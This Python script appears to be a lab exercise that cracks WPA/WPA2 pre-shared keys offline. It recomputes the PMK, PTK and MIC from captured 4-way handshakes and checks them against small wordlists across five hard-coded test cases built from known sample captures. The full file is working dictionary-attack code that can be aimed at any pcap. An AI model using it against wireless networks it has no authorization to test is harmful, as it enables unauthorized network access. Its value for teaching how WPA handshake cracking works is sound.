import codecs
import hashlib
import hmac
from hashlib import sha1, md5
from itertools import product

from pbkdf2 import PBKDF2
from scapy_eap import *


def pseudo_random_func512(key, a, b):
    r = b''
    i_counter = 0
    while len(r) * 8 < 512:
        tmp = a + chr(0x00).encode() + b + chr(i_counter).encode()
        hmac_sha1 = hmac.new(key, tmp, hashlib.sha1)
        r = r + hmac_sha1.digest()
        i_counter += 1
    return r[:64]


def string_to_int(chaine):
    return int(chaine.encode('hex'), 16)


def byte_to_string(s):
    return str(s, 'utf-8')


def cs(a):
    return codecs.decode(a, 'hex')


def encode(a):
    return codecs.encode(a, 'hex')


def get_ssid(packet):
    return packet.getlayer(Dot11Elt).info


def get_mac_addresses(packet):
    return cs(packet.getlayer(Dot11).addr1.replace(":", ""))


def get_nonce(packet):
    return packet.getlayer(WPA_key).nonce


def get_mic(packet):
    return byte_to_string(encode(packet.getlayer(WPA_key).wpa_key_mic))


def get_pmk(passphrase, ssid):
    f = PBKDF2(passphrase, ssid, 4096)
    return f.read(32)


def get_ptk(pmk, a, b):
    return pseudo_random_func512(pmk, a, b)


def generate_mic(kck, frame, mode):
    mic = hmac.new(kck, digestmod=mode)
    mic.update(frame)
    return mic.hexdigest()


def read_pcap(file):
    packets = rdpcap(file)
    ssid = get_ssid(packets[0])
    # get 4 handshakes
    list_packets_handshakes = [pk for pk in packets if pk.haslayer(WPA_key)]
    # get mac
    mac_of_station = get_mac_addresses(list_packets_handshakes[1])
    mac_of_access_point = get_mac_addresses(list_packets_handshakes[0])
    # get nonce
    nonce_a0 = get_nonce(list_packets_handshakes[2])
    nonce_s0 = get_nonce(list_packets_handshakes[1])
    # get mic
    mic = get_mic(list_packets_handshakes[3])
    # get hash_type, eapol_frame
    eapol_frame = list_packets_handshakes[3].getlayer(EAPOL)
    hash_type = md5
    if eapol_frame.key_descriptor_Version == 2:
        hash_type = sha1
    eapol_frame.wpa_key_mic = ''
    eapol_frame.key_ACK = 0
    eapol_frame = bytes(eapol_frame)
    return ssid, mac_of_station, mac_of_access_point, nonce_a0, nonce_s0, mic, eapol_frame, hash_type


# only used for test case capture_wpa.pcap
def create_word_dictionary(len_of_word):
    wordlist = []
    pre_fix = 'aaaa'
    lowercase_characters = 'abcdefghijklmnopqrstuvwxyz'
    keywords = [''.join(i) for i in product(lowercase_characters, repeat=len_of_word)]
    for key in keywords:
        s = pre_fix + key
        wordlist.append(s)
    return wordlist


def do_brute_force(test_case):
    if 0 < test_case < 6:
        print("Loading data...")
    if test_case == 1:
        ssid = b"linksys54gh"
        mac_of_station = cs(b'000c41d294fb')
        mac_of_access_point = cs(b'000d3a2610fb')
        nonce_a0 = cs(b'893ee551214557fff3c076ac977915a2060727038e9bea9b6619a5bab40f89c1')
        nonce_s0 = cs(b'dabdc104d457411aee338c00fa8a1f32abfc6cfb794360adce3afb5d159a51f6')
        mic = "d0ca4f2a783c4345b0c00a12ecc15f77"
        eapol_frame = cs(
            b'0103005ffe01090000000000000000001400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000')
        hash_type = md5
        wordlist = ["radiustest"]
    elif test_case == 2:
        ssid = b"soho-psk"
        mac_of_station = cs(b'000c41daf2e7')
        mac_of_access_point = cs(b'0020a64f31e4')
        nonce_a0 = cs(b'477ba8dc6d7e80d01a309d35891d868eb82bcc3b5d52b5a9a42c4cb7fd343a64')
        nonce_s0 = cs(b'ed12afbda8c583050032e5b5295382d27956fd584a6343bafe49135f26952a0f')
        mic = "f3a0f6914e28a2df103061a41ee83878"
        eapol_frame = cs(
            b'0103005ffe01090000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f3a0f6914e28a2df103061a41ee838780000')
        tmp_packet = EAPOL(eapol_frame)
        tmp_packet.key_ACK = 0
        tmp_packet.wpa_key_mic = ''
        eapol_frame = bytes(tmp_packet)
        hash_type = md5
        wordlist = ["secretsecret"]
    elif test_case == 3:
        file = "wpa-Induction.pcap"
        ssid, mac_of_station, mac_of_access_point, nonce_a0, nonce_s0, mic, eapol_frame, hash_type = read_pcap(file)
        wordlist = ["ABCTEST1", "ABCTEST2", "ABCTEST3", "ABCTEST4", "Induction"]
    elif test_case == 4:
        file = "capture_wpa.pcap"
        ssid, mac_of_station, mac_of_access_point, nonce_a0, nonce_s0, mic, eapol_frame, hash_type = read_pcap(file)
        wordlist = create_word_dictionary(4)
    elif test_case == 5:
        file = "WPA2-PSK-Final.cap"
        ssid, mac_of_station, mac_of_access_point, nonce_a0, nonce_s0, mic, eapol_frame, hash_type = read_pcap(file)
        wordlist = ["WPA2PSKFinal1", "WPA2PSKFinal2", "WPA2PSKFinal3", "Cisco123Cisco123"]
    else:
        do_brute_force(1)
        return

    iterator = 0
    flag = False
    print("Starting dictionary attack. Please be patient.")
    for word in wordlist:
        # Calculating PMK
        pmk = get_pmk(word, ssid)
        # Calculating PTK
        a = b"Pairwise key expansion"
        lower_mac = min(mac_of_access_point, mac_of_station)
        higher_mac = max(mac_of_access_point, mac_of_station)
        lower_nonce = min(nonce_a0, nonce_s0)
        higher_nonce = max(nonce_a0, nonce_s0)
        b = lower_mac + higher_mac + lower_nonce + higher_nonce
        ptk = get_ptk(pmk, a, b)
        # Calculating hmac Key MIC for this frame
        kck = ptk[:16]
        fake_mic = generate_mic(kck, eapol_frame, hash_type)
        if fake_mic == mic or mic in fake_mic:
            print(".\n\nAttack success! The PSK is \"{}\"".format(word))
            print("PMK for {}: {}".format(word, encode(pmk)))
            print("PTK with collected data and PMK: {}".format(encode(ptk)))
            print("Calculated MIC: {}".format(fake_mic))
            flag = True
            break
        else:
            iterator += 1
            print(".", end='')
    if not flag:
        print("\nAttack failed. Can not find the PSK")


# MAIN
while True:
    check_input = False
    while not check_input:
        test_case = input("Choose the test case (1-5): ")
        try:
            test_case = int(test_case)
            check_input = True
        except ValueError:
            print("No.. input is not a number. It's a string")

    do_brute_force(test_case)
    if input('\nDo You Want To Continue (y/n)?') != 'y':
        break
